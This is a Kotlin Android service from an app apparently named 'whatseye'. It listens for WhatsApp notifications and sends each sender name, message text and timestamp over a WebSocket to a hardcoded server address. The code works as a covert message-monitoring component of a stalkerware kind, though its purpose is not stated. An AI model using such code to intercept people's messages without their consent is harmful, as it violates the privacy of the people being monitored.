package com.example.whatseye.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.example.whatseye.api.WebSocketClient
import com.example.whatseye.dataType.data.NotificationData

class NotificationListener : NotificationListenerService() {
    private val webSocketManager = WebSocketClient()

    override fun onCreate() {
        super.onCreate()
        webSocketManager.initWebSocket("ws://192.168.243.116:8000/ws/notifications/")
    }
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if(sbn.packageName!= "com.whatsapp") return

        val notification = sbn.notification
        val extras = notification.extras

        val title = extras.getString(Notification.EXTRA_TITLE) ?: "No Title"
        val content = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: "No Content"
        val timestamp = sbn.postTime

        val notificationData = NotificationData(
            title = title,
            content = content,
            timestamp = timestamp
        )

        webSocketManager.sendNotification(notificationData)
    }
    }

